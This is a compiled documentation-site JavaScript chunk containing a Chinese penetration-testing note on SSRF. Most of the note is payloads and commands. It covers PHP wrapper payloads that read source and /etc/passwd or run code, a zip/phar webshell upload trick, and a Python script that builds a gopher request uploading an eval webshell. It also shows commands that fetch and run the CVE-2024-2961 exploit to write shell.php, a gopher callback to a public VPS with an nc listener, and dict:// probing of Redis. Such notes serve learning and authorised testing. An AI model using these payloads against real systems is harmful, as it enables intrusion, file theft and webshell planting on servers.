"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[8920],{8453:(e,n,i)=>{i.d(n,{R:()=>h,x:()=>r});var l=i(6540);const p={},t=l.createContext(p);function h(e){const n=l.useContext(t);return l.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(p):e.components||p:h(e.components),l.createElement(t.Provider,{value:n},e.children)}},9364:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>s,contentTitle:()=>r,default:()=>o,frontMatter:()=>h,metadata:()=>l,toc:()=>c});const l=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SSRF/README","title":"SSRF\u6f0f\u6d1e","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/03.SSRF/README.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/03.SSRF","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SSRF/","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SSRF/","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/03.SSRF/README.md","tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"\u5177\u6709\u76f8\u5bf9\u8def\u5f84\u8986\u76d6\u7684 XSS-IE 8/9 \u53ca\u66f4\u4f4e\u7248\u672c","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/XSS\u6ce8\u5165/XSSWithRelativePathOverwrite"},"next":{"title":"PathScan","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/\u5de5\u5177\u4f7f\u7528/PathScan"}}');var p=i(4848),t=i(8453);const h={},r="SSRF\u6f0f\u6d1e",s={},c=[{value:"\u6f0f\u6d1e\u4ecb\u7ecd",id:"\u6f0f\u6d1e\u4ecb\u7ecd",level:2},{value:"\u6f0f\u6d1e\u539f\u7406",id:"\u6f0f\u6d1e\u539f\u7406",level:2},{value:"\u6f0f\u6d1e\u5229\u7528",id:"\u6f0f\u6d1e\u5229\u7528",level:2},{value:"\u5185\u7f51\u8bbf\u95ee",id:"\u5185\u7f51\u8bbf\u95ee",level:3},{value:"PHP\u4f2a\u534f\u8bae\u5229\u7528",id:"php\u4f2a\u534f\u8bae\u5229\u7528",level:3},{value:"1.php://\u534f\u8bae",id:"1php\u534f\u8bae",level:4},{value:"php://filter",id:"phpfilter",level:5},{value:"php://input",id:"phpinput",level:5},{value:"php://output",id:"phpoutput",level:5},{value:"php://memory&amp;php://temp",id:"phpmemoryphptemp",level:5},{value:"php://fd",id:"phpfd",level:5},{value:"2.file://\u534f\u8bae",id:"2file\u534f\u8bae",level:4},{value:"3.phar://\u534f\u8bae",id:"3phar\u534f\u8bae",level:4},{value:"4.zlib://\u534f\u8bae",id:"4zlib\u534f\u8bae",level:4},{value:"5.data://\u534f\u8bae",id:"5data\u534f\u8bae",level:4},{value:"6.phar\u548czip",id:"6phar\u548czip",level:4},{value:"CVE-2024-2961",id:"cve-2024-2961",level:3},{value:"Gopher",id:"gopher",level:3},{value:"Dict",id:"dict",level:3},{value:"CVE-2021-21287",id:"cve-2021-21287",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",h5:"h5",header:"header",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,t.R)(),...e.components};return(0,p.jsxs)(p.Fragment,{children:[(0,p.jsx)(n.header,{children:(0,p.jsx)(n.h1,{id:"ssrf\u6f0f\u6d1e",children:"SSRF\u6f0f\u6d1e"})}),"\n",(0,p.jsxs)(n.table,{children:[(0,p.jsx)(n.thead,{children:(0,p.jsxs)(n.tr,{children:[(0,p.jsx)(n.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,p.jsx)(n.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,p.jsx)(n.tbody,{children:(0,p.jsxs)(n.tr,{children:[(0,p.jsx)(n.td,{style:{textAlign:"left"},children:(0,p.jsx)(n.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,p.jsx)(n.td,{style:{textAlign:"left"},children:"2025-10-15 00:32:16"})]})})]}),"\n",(0,p.jsx)(n.h2,{id:"\u6f0f\u6d1e\u4ecb\u7ecd",children:"\u6f0f\u6d1e\u4ecb\u7ecd"}),"\n",(0,p.jsxs)(n.p,{children:[(0,p.jsx)(n.strong,{children:"SSRF"}),"\uff1a\u5168\u79f0 Server-Side Request Forgery\uff0c\u5373 \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u3002\u662f\u4e00\u4e2a\u7531\u653b\u51fb\u8005\u6784\u9020\u8bf7\u6c42\uff0c\u5728\u76ee\u6807\u670d\u52a1\u7aef\u6267\u884c\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u4f7f\u670d\u52a1\u5668\u7aef\u5411\u653b\u51fb\u8005\u6784\u9020\u7684\u4efb\u610f\u57df\u53d1\u51fa\u8bf7\u6c42\uff0c\u76ee\u6807\u901a\u5e38\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5229\u7528\u670d\u52a1\u5668\u6f0f\u6d1e\u4ee5\u670d\u52a1\u5668\u7684\u8eab\u4efd\u53d1\u9001\u4e00\u6761\u6784\u9020\u597d\u7684\u8bf7\u6c42\u7ed9\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u8fdb\u884c\u653b\u51fb\u3002"]}),"\n",(0,p.jsx)(n.h2,{id:"\u6f0f\u6d1e\u539f\u7406",children:"\u6f0f\u6d1e\u539f\u7406"}),"\n",(0,p.jsxs)(n.p,{children:["SSRF\u5168\u79f0\u4e3aServer-side Request Fogery,\u4e2d\u6587\u542b\u4e49\u4e3a\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u662f\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u80fd\u591f\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u4ece\u6307\u5b9a\u7684URL\u5730\u5740\u83b7\u53d6\u7f51\u9875\u5185\u5bb9\uff0c\u52a0\u8f7d\u6307\u5b9a\u5730\u5740\u7684\u56fe\u7247\u3001\u6570\u636e\u3001\u4e0b\u8f7d\u7b49\u7b49\u3002\u6f0f\u6d1eURL\u793a\u4f8b: ",(0,p.jsx)(n.a,{href:"http://xxx.com/api/readFiles?url=http://10.1.11/xxx",children:"http://xxx.com/api/readFiles?url=http://10.1.11/xxx"})]}),"\n",(0,p.jsx)(n.h2,{id:"\u6f0f\u6d1e\u5229\u7528",children:"\u6f0f\u6d1e\u5229\u7528"}),"\n",(0,p.jsx)(n.h3,{id:"\u5185\u7f51\u8bbf\u95ee",children:"\u5185\u7f51\u8bbf\u95ee"}),"\n",(0,p.jsx)(n.p,{children:"\u4f7f\u7528http\u534f\u8bae\u5bf9\u5185\u7f51\u7684Web\u5e94\u7528\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"?url=http://127.0.0.1/flag.php\n"})}),"\n",(0,p.jsx)(n.h3,{id:"php\u4f2a\u534f\u8bae\u5229\u7528",children:"PHP\u4f2a\u534f\u8bae\u5229\u7528"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{className:"language-php",children:"file:// \u2014 \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\nhttp:// \u2014 \u8bbf\u95ee HTTP(s) \u7f51\u5740\nftp:// \u2014 \u8bbf\u95ee FTP(s) URLs\nphp:// \u2014 \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09\nzlib:// \u2014 \u538b\u7f29\u6d41\ndata:// \u2014 \u6570\u636e\uff08RFC 2397\uff09\nglob:// \u2014 \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84\u6a21\u5f0f\nphar:// \u2014 PHP \u5f52\u6863\nssh2:// \u2014 Secure Shell 2\nrar:// \u2014 RAR\nogg:// \u2014 \u97f3\u9891\u6d41\nexpect:// \u2014 \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41\ndict:// - dict\n"})}),"\n",(0,p.jsx)(n.h4,{id:"1php\u534f\u8bae",children:"1.php://\u534f\u8bae"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"php://filter\nphp://input\n"})}),"\n",(0,p.jsx)(n.h5,{id:"phpfilter",children:"php://filter"}),"\n",(0,p.jsx)(n.p,{children:"\u5728allow_url_fopen\uff0callow_url_include\u90fd\u5173\u95ed\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\uff0c\u4e3b\u8981\u7528\u4e8e\u8bfb\u53d6\u6e90\u4ee3\u7801\u5e76\u8fdb\u884cbase64\u7f16\u7801\u8f93\u51fa\u3002\npayload\u5982\u4e0b\uff1a"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"php://filter/read=convert.base64-encode/resource=upload.php\n"})}),"\n",(0,p.jsxs)(n.p,{children:["\u5229\u7528",(0,p.jsx)(n.code,{children:"CVE-2024-2961"}),"\u53efRCE"]}),"\n",(0,p.jsx)(n.h5,{id:"phpinput",children:"php://input"}),"\n",(0,p.jsx)(n.p,{children:"\u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\u3002CTF\u4e2d\u7ecf\u5e38\u4f7f\u7528file_get_contents\u83b7\u53d6php://input\u5185\u5bb9(POST)\uff0c\u9700\u8981\u5f00\u542fallow_url_include\uff0c\u5e76\u4e14\u5f53enctype=\u201dmultipart/form-data\u201d\u7684\u65f6\u5019 php://input\u662f\u65e0\u6548\u7684\u3002"}),"\n",(0,p.jsx)(n.h5,{id:"phpoutput",children:"php://output"}),"\n",(0,p.jsx)(n.p,{children:"php://output \u662f\u4e00\u4e2a\u53ea\u5199\u7684\u6570\u636e\u6d41\uff0c \u5141\u8bb8\u4f60\u4ee5 print \u548c echo \u4e00\u6837\u7684\u65b9\u5f0f \u5199\u5165\u5230\u8f93\u51fa\u7f13\u51b2\u533a\u3002"}),"\n",(0,p.jsx)(n.h5,{id:"phpmemoryphptemp",children:"php://memory&php://temp"}),"\n",(0,p.jsxs)(n.p,{children:["php://memory \u548c php://temp \u662f\u4e00\u4e2a\u7c7b\u4f3c\u6587\u4ef6 \u5305\u88c5\u5668\u7684\u6570\u636e\u6d41\uff0c\u5141\u8bb8\u8bfb\u5199\u4e34\u65f6\u6570\u636e\u3002 \u4e24\u8005\u7684\u552f\u4e00\u533a\u522b\u662f php://memory \u603b\u662f\u628a\u6570\u636e\u50a8\u5b58\u5728\u5185\u5b58\u4e2d\uff0c \u800c php://temp \u4f1a\u5728\u5185\u5b58\u91cf\u8fbe\u5230\u9884\u5b9a\u4e49\u7684\u9650\u5236\u540e\uff08\u9ed8\u8ba4\u662f 2MB\uff09\u5b58\u5165\u4e34\u65f6\u6587\u4ef6\u4e2d\u3002 \u4e34\u65f6\u6587\u4ef6\u4f4d\u7f6e\u7684\u51b3\u5b9a\u548c sys_get_temp_dir() \u7684\u65b9\u5f0f\u4e00\u81f4\u3002\nphp://temp \u7684\u5185\u5b58\u9650\u5236\u53ef\u901a\u8fc7\u6dfb\u52a0 /maxmemory",":NN"," \u6765\u63a7\u5236\uff0cNN \u662f\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3001\u4fdd\u7559\u5728\u5185\u5b58\u7684\u6700\u5927\u6570\u636e\u91cf\uff0c\u8d85\u8fc7\u5219\u4f7f\u7528\u4e34\u65f6\u6587\u4ef6\u3002"]}),"\n",(0,p.jsx)(n.h5,{id:"phpfd",children:"php://fd"}),"\n",(0,p.jsx)(n.h4,{id:"2file\u534f\u8bae",children:"2.file://\u534f\u8bae"}),"\n",(0,p.jsx)(n.p,{children:"file://\uff1a\u7528\u4e8e\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u4e14\u4e0d\u53d7allow_url_fopen\uff0callow_url_include\u5f71\u54cd\uff0cfile://\u8fd8\u7ecf\u5e38\u548ccurl\u51fd\u6570(SSRF)\u7ed3\u5408\u5728\u4e00\u8d77\u3002\u4f8b\u5b50\u4e00\uff0c\u4f8b\u5b50\u4e8c\n\u4f7f\u7528\u65b9\u6cd5\uff1a"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"file:// [\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]\nfile:///etc/passwd\n"})}),"\n",(0,p.jsx)(n.p,{children:"ssrf poc gopher"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:'import urllib.parse\n\na = \\\n"""POST /index.php HTTP/1.1\nHost: 127.0.0.2:8080\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------21311722966185605194227162997\nContent-Length: 365\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n-----------------------------21311722966185605194227162997\nContent-Disposition: form-data; name="upfile"; filename="cmd.png"\nContent-Type: image/png\n\n\n<?php @eval($_POST[\'cmd\']);?>\n-----------------------------21311722966185605194227162997\nContent-Disposition: form-data; name="submit"\n\n\u4e0a\u4f20\n-----------------------------21311722966185605194227162997--\n"""\n\ntmp = urllib.parse.quote(a)\nb = tmp.replace(\'%0A\',\'%0D%0A\')\nres = \'_\'+b\nprint("gopher://127.0.0.2:8080/"+res)\n'})}),"\n",(0,p.jsx)(n.h4,{id:"3phar\u534f\u8bae",children:"3.phar://\u534f\u8bae"}),"\n",(0,p.jsx)(n.p,{children:"phar://\uff1aPHP \u5f52\u6863\uff0c\u5e38\u5e38\u8ddf\u6587\u4ef6\u5305\u542b\uff0c\u6587\u4ef6\u4e0a\u4f20\u7ed3\u5408\u7740\u8003\u5bdf\u3002\u5f53\u6587\u4ef6\u4e0a\u4f20\u4ec5\u4ec5\u6821\u9a8cmime\u7c7b\u578b\u4e0e\u6587\u4ef6\u540e\u7f00\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u8fdb\u884c\u5229\u7528\u3002\u4f8b\u5b50\u4e00"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"nac.php(\u6728\u9a6c)->\u538b\u7f29->nac.zip->\u6539\u540e\u7f00->nac.jpg->\u4e0a\u4f20->phar://nac.jpg/nac.php\n"})}),"\n",(0,p.jsx)(n.h4,{id:"4zlib\u534f\u8bae",children:"4.zlib://\u534f\u8bae"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"zip://\uff1a\u5728allow_url_fopen\uff0callow_url_include\u90fd\u5173\u95ed\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\uff0c\u4f7f\u7528\u5982\u4e0b\uff1a\n\nfile.php?file=zip://[\u538b\u7f29\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84]#[\u538b\u7f29\u6587\u4ef6\u5185\u7684\u5b50\u6587\u4ef6\u540d]\nfile.php?file=zip://nac.jpg#nac.php  \u5176\u4e2dget\u8bf7\u6c42\u4e2d#\u9700\u8981\u8fdb\u884c\u7f16\u7801\uff0c\u5373%23\n"})}),"\n",(0,p.jsx)(n.p,{children:"bzip2://\uff1a\u5728allow_url_fopen\uff0callow_url_include\u90fd\u5173\u95ed\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\uff0c\u4f7f\u7528\u5982\u4e0b\uff1a"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"file.php?file=compress.bzip2://nac.bz2\nfile.php?file=compress.bzip2://./nac.jpg\nfile.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg\n"})}),"\n",(0,p.jsx)(n.p,{children:"zlib://\uff1a\u5728allow_url_fopen\uff0callow_url_include\u90fd\u5173\u95ed\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\uff0c\u4f7f\u7528\u5982\u4e0b\uff1a"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"file.php?file=compress.zlib://file.gz\nfile.php?file=compress.zlib://./nac.jpg\nfile.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg\n"})}),"\n",(0,p.jsx)(n.h4,{id:"5data\u534f\u8bae",children:"5.data://\u534f\u8bae"}),"\n",(0,p.jsx)(n.p,{children:"data://\uff1a\u9700\u6ee1\u8db3allow_url_fopen\uff0callow_url_include\u540c\u65f6\u5f00\u542f\u624d\u80fd\u4f7f\u7528\uff0c\u4f7f\u7528\u5982\u4e0b\uff1a"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"file.php?file=data://text/plain,<?php phpinfo()?>\nfile.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\nfile.php?file=data:text/plain,<?php phpinfo()?>\nfile.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n"})}),"\n",(0,p.jsx)(n.h4,{id:"6phar\u548czip",children:"6.phar\u548czip"}),"\n",(0,p.jsx)(n.p,{children:(0,p.jsx)(n.a,{href:"https://kit4y.github.io/2020/01/04/phar-de-li-yong-zi-shi/",children:"https://kit4y.github.io/2020/01/04/phar-de-li-yong-zi-shi/"})}),"\n",(0,p.jsx)(n.h3,{id:"cve-2024-2961",children:"CVE-2024-2961"}),"\n",(0,p.jsxs)(n.p,{children:["\u5229\u7528",(0,p.jsx)(n.code,{children:"php://filter"}),"\u548c",(0,p.jsx)(n.code,{children:"iconv()"}),"\u51fd\u65702.39\u8fdb\u884cRCE"]}),"\n",(0,p.jsx)(n.p,{children:(0,p.jsx)(n.a,{href:"https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/README.zh-cn.md",children:"https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/README.zh-cn.md"})}),"\n",(0,p.jsxs)(n.p,{children:["\u5728\u4f7f\u7528\u539f\u4f5c\u8005\u7ed9\u51fa\u7684",(0,p.jsx)(n.a,{href:"https://github.com/ambionics/cnext-exploits",children:"exploit"}),"\u524d\uff0c\u4f60\u9700\u8981\u51c6\u5907\u4e00\u4e2aLinux\u73af\u5883\u548cPython 3.10\u89e3\u91ca\u5668\u3002"]}),"\n",(0,p.jsx)(n.p,{children:"\u5b89\u88c5\u4f9d\u8d56\uff1a"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"pip install pwntools\npip install https://github.com/cfreal/ten/archive/refs/heads/main.zip\n"})}),"\n",(0,p.jsxs)(n.p,{children:["\u7136\u540e\u4ece",(0,p.jsx)(n.a,{href:"https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py",children:"cnext-exploit"}),"\u4e0b\u8f7dPOC\u5e76\u6267\u884c\uff1a"]}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"wget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py\npython cnext-exploit.py http://your-ip:8080/index.php \"echo '<?=phpinfo();?>' > shell.php\"\n"})}),"\n",(0,p.jsx)(n.p,{children:(0,p.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191642389.png",alt:"1"})}),"\n",(0,p.jsxs)(n.p,{children:["\u53ef\u89c1\uff0c\u6211\u4eec\u5df2\u7ecf\u6210\u529f\u5199\u5165",(0,p.jsx)(n.code,{children:"shell.php"}),"\uff1a"]}),"\n",(0,p.jsx)(n.p,{children:(0,p.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191642390.png",alt:"2"})}),"\n",(0,p.jsx)(n.h3,{id:"gopher",children:"Gopher"}),"\n",(0,p.jsxs)(n.p,{children:[(0,p.jsx)(n.strong,{children:"gopher"}),"\uff1agopher\u534f\u8bae\u652f\u6301\u53d1\u51faGET\u3001POST\u8bf7\u6c42\uff1a\u53ef\u4ee5\u5148\u622a\u83b7get\u8bf7\u6c42\u5305\u548cpost\u8bf7\u6c42\u5305\uff0c\u518d\u6784\u9020\u6210\u7b26\u5408gopher\u534f\u8bae\u7684\u8bf7\u6c42\u3002gopher\u534f\u8bae\u662fssrf\u5229\u7528\u4e2d\u4e00\u4e2a\u6700\u5f3a\u5927\u7684\u534f\u8bae\uff08\u4fd7\u79f0\u4e07\u80fd\u534f\u8bae\uff09\u3002"]}),"\n",(0,p.jsx)(n.p,{children:(0,p.jsxs)(n.strong,{children:["\u516c\u7f51IP\u7684VPS\u76d1\u542c ",(0,p.jsx)(n.code,{children:"2333"})," \u7aef\u53e3"]})}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"[root@host ~]# nc -lvp 2333\nNcat: Version 6.40 ( http://nmap.org/ncat )\nNcat: Listening on :::2333\nNcat: Listening on 0.0.0.0:2333\n"})}),"\n",(0,p.jsx)(n.p,{children:(0,p.jsx)(n.strong,{children:"\u5229\u7528 gopher \u534f\u8bae\u8bbf\u95ee"})}),"\n",(0,p.jsxs)(n.p,{children:["\u6d4f\u89c8\u5668\u76f4\u63a5\u8bbf\u95ee\u6216\u8005\u7528 ",(0,p.jsx)(n.code,{children:"curl url"})]}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"http://127.0.0.1/ssrf.php?url=gopher://66.112.213.76:2333/_hello\n"})}),"\n",(0,p.jsx)(n.p,{children:(0,p.jsx)(n.strong,{children:"\u6536\u5230\u56de\u663e"})}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"[root@host ~]# nc -lvp 2333\nNcat: Version 6.40 ( http://nmap.org/ncat )\nNcat: Listening on :::2333\nNcat: Listening on 0.0.0.0:2333\nNcat: Connection from 183.xxx.xxx.xxx.\nNcat: Connection from 183.xxx.xxx.xxx:9661.\nhello\n"})}),"\n",(0,p.jsx)(n.h3,{id:"dict",children:"Dict"}),"\n",(0,p.jsxs)(n.p,{children:["\u56e0\u4e3a\u6b64\u5904 ",(0,p.jsx)(n.code,{children:"ssrf.php"})," \u7684\u6f0f\u6d1e\u4ee3\u7801\u6709\u56de\u663e\uff0c\u6240\u4ee5\u6d4f\u89c8\u5668\u76f4\u63a5\u8bbf\u95ee"]}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:6379/info\n"})}),"\n",(0,p.jsx)(n.p,{children:"\u6216\u8005\u7ec8\u7aef"}),"\n",(0,p.jsx)(n.pre,{children:(0,p.jsx)(n.code,{children:"curl http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:6379/info\n"})}),"\n",(0,p.jsx)(n.p,{children:"\u53ef\u4ee5\u83b7\u53d6Redis\u7684\u914d\u7f6e\u4fe1\u606f"}),"\n",(0,p.jsx)(n.p,{children:(0,p.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191642391.png",alt:"Redis\u914d\u7f6e"})}),"\n",(0,p.jsx)(n.p,{children:"\u540c\u7406\u4e5f\u53ef\u4ee5\u6dfb\u52a0\u6216\u8005\u67e5\u770bRedis\u7684\u4fe1\u606f"}),"\n",(0,p.jsx)(n.p,{children:"\u67e5\u770bRedis\u5b58\u50a8\u7684\u5185\u5bb9"}),"\n",(0,p.jsx)(n.p,{children:(0,p.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191642393.png",alt:"2"})}),"\n",(0,p.jsx)(n.h3,{id:"cve-2021-21287",children:"CVE-2021-21287"}),"\n",(0,p.jsx)(n.p,{children:(0,p.jsx)(n.a,{href:"https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html",children:"https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html"})}),"\n",(0,p.jsx)(n.h1,{id:"reference",children:"Reference"}),"\n",(0,p.jsxs)(n.ul,{children:["\n",(0,p.jsx)(n.li,{children:(0,p.jsx)(n.a,{href:"https://marmalade.vip/phpweixieyizongjie.html#toc-heading-2",children:"https://marmalade.vip/phpweixieyizongjie.html#toc-heading-2"})}),"\n",(0,p.jsx)(n.li,{children:(0,p.jsx)(n.a,{href:"https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html",children:"https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html"})}),"\n"]})]})}function o(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,p.jsx)(n,{...e,children:(0,p.jsx)(d,{...e})}):d(e)}}}]);